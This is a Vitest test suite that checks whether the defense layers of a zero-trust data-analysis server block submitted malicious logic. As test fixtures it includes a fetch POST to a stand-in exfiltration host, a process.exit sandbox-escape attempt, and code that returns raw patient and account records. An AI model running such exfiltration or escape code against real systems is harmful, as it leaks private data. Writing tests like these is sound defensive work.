import { describe, expect, it } from "vitest";
import { callTool, liopEnvelope, extractText } from "./_helpers.js";

const NEXUS_URL = process.env.NEXUS_URL || "http://127.0.0.1:15000";

describe("Production Audit Suite 05 — The Six Defense Layers of Zero-Trust Security", () => {
	it("Layer 1 (Guardian AST): should statically intercept forbidden network & process globals", async () => {
		const maliciousLogic = [
			"fetch('https://malicious-exfiltration.com/leak', { method: 'POST' });",
			"return { leaked: true };",
		].join("\n");

		const envelope = liopEnvelope(maliciousLogic, "AstMaliciousTest");
		const res = await callTool("Analyze_Synthetic_Bank_Transactions", envelope, NEXUS_URL, 15000);

		const text = extractText(res);
		const isBlocked = res?.isError === true || /guardian|forbidden|blocked|ast|violation/i.test(text);
		expect(isBlocked).toBe(true);
		console.log(`[Guardian AST Intercepted] ${text}`);
	});

	it("Layer 2 (WASI Sandbox Isolation): should prevent access to process.env and Node APIs", async () => {
		const sandboxEscape = [
			"const p = process.exit(1);",
			"return { escaped: true };",
		].join("\n");

		const envelope = liopEnvelope(sandboxEscape, "WasiEscapeTest");
		const res = await callTool("Analyze_Synthetic_Medical_Records", envelope, NEXUS_URL, 15000);

		const text = extractText(res);
		const isBlocked = res?.isError === true || /blocked|error|undefined|violation|exit/i.test(text);
		expect(isBlocked).toBe(true);
	});

	it("Layer 4 (Egress PII Shield): should intercept attempts to exfiltrate unaggregated raw records", async () => {
		const piiLeakLogic = [
			"const records = env.records;",
			// Attempt to leak patient names and diagnosis directly
			"return { total: records.length, records: records.slice(0, 5) };",
		].join("\n");

		const envelope = liopEnvelope(piiLeakLogic, "PiiLeakAttack");
		const res = await callTool("Analyze_Synthetic_Medical_Records", envelope, NEXUS_URL, 15000);

		const text = extractText(res);
		const isBlocked = res?.isError === true || /pii|shield|blocked|aggregation|policy/i.test(text);
		expect(isBlocked).toBe(true);
		console.log(`[PII Shield Active Interception] ${text}`);
	});

	it("Layer 5 (Aggregation-First Policy): should reject queries returning arrays of individual entities", async () => {
		const nonAggregatedLogic = [
			"const accounts = env.records;",
			"return { accounts: accounts.map(a => a.id) };",
		].join("\n");

		const envelope = liopEnvelope(nonAggregatedLogic, "AggregationPolicyTest");
		const res = await callTool("Analyze_Synthetic_Bank_Transactions", envelope, NEXUS_URL, 15000);

		const text = extractText(res);
		const isBlocked = res?.isError === true || /aggregation|blocked|policy|error/i.test(text);
		expect(isBlocked).toBe(true);
	});

	it("Layer 6 (ZK-Receipt Integrity): should generate valid cryptographic proof bound to dataset", async () => {
		const validLogic = [
			"const accounts = env.records;",
			"return { totalAccounts: accounts.length, totalBalance: accounts.reduce((a, b) => a + b.balance, 0) };",
		].join("\n");

		const envelope = liopEnvelope(validLogic, "ZkReceiptVerification");
		const res = await callTool("Analyze_Synthetic_Bank_Transactions", envelope, NEXUS_URL, 20000);

		expect(res.isError).toBeFalsy();
		const text = extractText(res);
		const data = JSON.parse(text);

		expect(data.zk_receipt).toBeDefined();
		const receiptStr = typeof data.zk_receipt === "string" ? data.zk_receipt : JSON.stringify(data.zk_receipt);
		expect(receiptStr.length).toBeGreaterThan(32);
		console.log(`[ZK-Receipt Verified] Wire Receipt Length: ${receiptStr.length} chars (HMAC-SHA256 bound)`);
	});
});
